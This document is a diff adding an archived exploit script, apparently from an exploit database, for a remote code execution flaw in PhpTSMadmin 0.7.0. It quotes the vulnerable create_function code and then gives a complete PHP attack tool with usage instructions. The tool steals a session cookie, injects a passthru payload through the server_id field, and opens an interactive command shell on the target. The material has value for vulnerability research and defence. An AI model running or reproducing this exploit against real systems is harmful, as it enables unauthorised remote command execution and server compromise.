@@ -1,0 +1,100 @@
+id: 17848
+date: 03/28/2012
+title: PhpTSMadmin 0.7.0 (functions.php) Remote Code Execution
+author: Adel SBM
+cves: 
+
+<?php
+/*
++------------------------------------------------------------------+
++ PhpTSMadmin 0.7.0 (functions.php) Remote Code Execution          +
++------------------------------------------------------------------+
+ 
+Web-App        : PhpTSMadmin 0.7.0
+Vendor         : http://phptsmadmin.sourceforge.net/
+Vulnerability  : Remote Code Execution
+Author         : Adel SBM
+Website        : www.The-code.tk
+Tested on      : Windows XP SP2
+Greetz         : Inj3ct0r Milw0rm Exploit DataBase 1337day.com
+                        
++-------------------------------------------------------------------+
++                         Algeria                                   +
++-------------------------------------------------------------------+
+
+    [-] vulnerable code in /lib/functions.php
+
+    1002.    function masort(&$data,$sortby,$rev=0) {
+    1003.        if (defined('DEBUG_ENABLED') && DEBUG_ENABLED && (($fargs=func_get_args())||$fargs='NOARGS'))
+    1004.            debug_log('Entered (%%)',1,0,__FILE__,__LINE__,__METHOD__,$fargs);
+    1005.  
+    1006.        # if the array to sort is null or empty
+    1007.        if (! $data) return;
+    ....
+    1080.            $CACHE[$sortby] = create_function('$a, $b',$code);
+    1081.        }
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die( "\n[-] No Response From {$host}:80\n");
+
+    fwrite($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+print "\n+------------------------------------------------------------------------+";
+print "\n| PhpTSMadmin 0.7.0 Remote Code Execution Exploit by Adel SBM            |";
+print "\n| Greetz to: EgiX & The Don & Over-X & ind0ushka ..                      |";
+print "\n| TeaM Official website: www.The-code.tk                                 |";
+print "\n| Algeria                                                                |";
+print "\n+------------------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+print "\n+------------------------------------------------------------------------+";
+print "\n| Usage......: php $argv[0] <host> <path>                                 |";
+print "\n| Example....: php $argv[0] localhost /                                   |";
+print "\n| Example....: php $argv[0] localhost /phptsmadmin/htdocs/                |";
+print "\n+------------------------------------------------------------------------+\n";
+die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+$packet  = "GET {$path}index.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+if (!preg_match("/Set-Cookie: ([^;]*);/", http_send($host, $packet), $sid)) die("\n[-] Session ID not found!\n");
+
+$phpcode = "foo));}}error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die;/*";
+$payload = "cmd=login_form&server_id={$phpcode}";
+
+$packet  = "POST {$path}cmd.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: {$sid[1]}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+while(1)
+{
+    print "\nshell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    preg_match("/_code_(.*)/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ?
+    print $m[1] : die("\n[-] Exploit failed!\n");
+}
+
+?>
+
+
+
+#  0day.today [2023-03-27]  #
